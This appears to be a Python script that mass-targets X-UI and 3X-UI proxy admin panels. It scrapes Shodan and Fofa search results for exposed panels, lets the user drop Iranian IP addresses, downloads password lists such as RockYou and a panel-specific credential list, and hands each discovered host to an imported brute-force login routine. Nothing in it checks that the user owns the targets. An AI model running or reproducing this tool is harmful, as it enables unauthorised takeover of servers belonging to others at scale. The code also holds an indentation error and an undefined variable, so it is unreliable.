from urllib.parse import urlparse
import requests
from bs4 import BeautifulSoup
import ipaddress
import os
import tldextract
from wee import crackingxui
import platform

def clear_console():
    if platform.system() == "Windows":
        os.system("cls")
    else:
        os.system("clear")
def is_ip(host):
    try:
        ipaddress.ip_address(host)
        return True
    except ValueError:
        return False

def select_passlist():
    options = {
        "1": ("476 Word (fast)", "https://raw.githubusercontent.com/beatester/passxui/main/X-ui%20Login%20Credentials.txt"),
        "2": ("10k pass (normal)", "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10k-most-common.txt"),
        "3": ("Rockyou1 (kali passlist/ slow)", "https://raw.githubusercontent.com/josuamarcelc/common-password-list/refs/heads/main/rockyou.txt/rockyou_1.txt"),
        "4": ("Rockyou2 (kali passlist / slow)", "https://raw.githubusercontent.com/josuamarcelc/common-password-list/refs/heads/main/rockyou.txt/rockyou_2.txt"),
    }
    print("Choose your passlist:")
    for key, (name, _) in options.items():
        print(f"{key}. {name}")
    choice = ""
    while choice not in options:
        choice = input("Enter option number: ").strip()
    return options[choice][1]
def select_source_advanced():
    options = {
        "1": ("Shodan (xui)", ["https://www.shodan.io/search?query=xui"]),
        "2": ("Shodan (3xui)", ["https://www.shodan.io/search?query=xui+%2Fassets%2Fant-design-vue%401.7.8"]),
        "3": ("Fofa (xui)", ["https://en.fofa.info/result?qbase64=Inh1aSI%3D"]),
        "4": ("Fofa (3xui)", ["https://en.fofa.info/result?qbase64=L2Fzc2V0cy9hbnQtZGVzaWduLXZ1ZUAxLjcuOA=="]),
        "5": ("All Sources (Combine All)", [
            "https://www.shodan.io/search?query=xui",
            "https://www.shodan.io/search?query=xui+%2Fassets%2Fant-design-vue%401.7.8",
            "https://en.fofa.info/result?qbase64=Inh1aSI%3D",
            "https://en.fofa.info/result?qbase64=L2Fzc2V0cy9hbnQtZGVzaWduLXZ1ZUAxLjcuOA=="
        ]),
        "6": ("Single Target", [])
    }

    print("\nChoose source(s): (you can select multiple with comma)")
    for key, (desc, _) in options.items():
        print(f"{key}. {desc}")

    while True:
        choice = input("Enter option number(s) (e.g. 1,3): ").strip()
        selected = [c.strip() for c in choice.split(',') if c.strip() in options]
        if selected:
            break
        print("Invalid selection, try again.")

    # جمع همه URL های انتخاب شده در یک لیست
    selected_urls = []
    for c in selected:
        if c == "6":
            manual_url = input("Enter taget URL (e.g. http://1.2.3.4:54321/):").strip()
            if manual_url:
#                selected_urls.append(manual_url)
                return[("manual", manual_url)]
            else:
                print("No URL entered. Exiting")
                exit(0)
        else:        
            selected_urls.extend(options[c][1])

    return selected_urls

def ask_country_filter():
    print("\nFilter out Iranian IPs?")
    print("1. Yes")
    print("2. No")
    choice = input("Enter option: ").strip()
    return choice == "1"

def extract_links_from_html(url):
    try:
        response = requests.get(url)
        if response.status_code != 200:
            print("Error loading:", url)
            return []
        soup = BeautifulSoup(response.text, 'html.parser')
        return [link.get('href') for link in soup.find_all('a') if link.get('href')]
    except Exception as e:
        print("Error in extract_links_from_html:", e)
        return []

def filter_valid_urls(links, filter_iran=True):
    valid_urls = []
    skip_domains = ["shodan.io", "linkedin.com", "twitter.com", "facebook.com", "gravwell.io"]
    counteringurl = 1  # شمارنده‌ی شماره آدرس‌ها
    for url in links:
        try:
            reso = urlparse(url)
            if not reso.scheme or not reso.netloc:
                continue
            host = reso.hostname
            if not host:
                continue

            if is_ip(host):
                domain_type = "IP"
            else:
                ext = tldextract.extract(host)
                domain_type = ext.domain + "." + ext.suffix if ext.suffix else host
                #print("domain: ", domain_type) 
            if domain_type in skip_domains:
                continue

            country = "Unknown"
            ip_api_url = f"https://api.iplocation.net/?ip={host}"
            resp = requests.get(ip_api_url, timeout=5)
            res = resp.json()
            country = res.get("country_name", "Unknown")
            if filter_iran:
                if "Iran" in country:
                    continue

            print(f"✓ {counteringurl} Valid: {url} | Country: {country}")
            valid_urls.append(url)
            counteringurl += 1
        except Exception as e:
            print(f"Error checking IP: {e}")
            continue
    return valid_urls

def wrapper_cracker(args):
    url, passlist_url = args
    return crackingxui(url, passlist_url)

# اجرای اصلی
if __name__ == "__main__":
    import time
    try:
        while True:
            clear_console()
            print("Script Run\nPlease Wait\n")
            print("Creator : Kilidshekan@gmail.com\n")

            passlist_url = select_passlist()
            clear_console()
            source_urls = select_source_advanced()
            clear_console()         
            if len(source_urls) == 1 and isinstance(source_urls[0], tuple) and source_urls[0][0] == "manual":
                clear_console()     
                try:
                    manual_url = source_urls[0][1]
                    print(f"[*] Cracking manual target directly: {manual_url}")
                    wrapper_cracker((manual_url, passlist_url))
                except KeyboardInterrupt:
                            try:
                                choice = input("\n[!] Ctrl+C detected. Skip this target? (y/n) [default: y]: ").strip().lower()
                                if choice in ["", "y", "yes"]:
                                    print("[*] Skipping target...\n")
                                    continue
                                else:
                                    print("[*] Continuing with current target...\n")
                                    wrapper_cracker((url, passlist_url))
                            except KeyboardInterrupt:
                                print("\n[!] Double Ctrl+C detected. Exiting script...\n")
                                raise    
            else:
                filter_iran = ask_country_filter()
                clear_console()

                all_valid_targets = []
                for src_url in source_urls:
                    raw_links = extract_links_from_html(src_url)
                    valid = filter_valid_urls(raw_links, filter_iran)
                    all_valid_targets.extend(valid)
            
                if all_valid_targets:
                    print(f"\n{len(all_valid_targets)} valid targets found. Starting cracking...\n")
                    counteringurlinprocess = 1
                    for url in all_valid_targets:
                        try:
                            print(f"{counteringurlinprocess}: {url}")
                            wrapper_cracker((url, passlist_url))
                            counteringurlinprocess += 1
                        except KeyboardInterrupt:
                            try:
                                choice = input("\n[!] Ctrl+C detected. Skip this target? (y/n) [default: y]: ").strip().lower()
                                if choice in ["", "y", "yes"]:
                                    print("[*] Skipping target...\n")
                                     counteringurlinprocess += 1
                                    continue
                                else:
                                    print("[*] Continuing with current target...\n")
                                    wrapper_cracker((url, passlist_url))
                            except KeyboardInterrupt:
                                print("\n[!] Double Ctrl+C detected. Exiting script...\n")
                                raise
##                for url in all_valid_targets:
##                    print(url,"| Country: ",country)
##                    wrapper_cracker((url, passlist_url))
                else:
                    print("No valid targets found.")
            again= input("\nDo you want to run again? (y/n) Default is y : ").strip().lower()
            if again == "n":
                print("Exiting...")
                break
            time.sleep(1)
            
    except KeyboardInterrupt:
        print("\n\n[!] Process interrupted by user (Ctrl+C). Exiting gracefully...\n")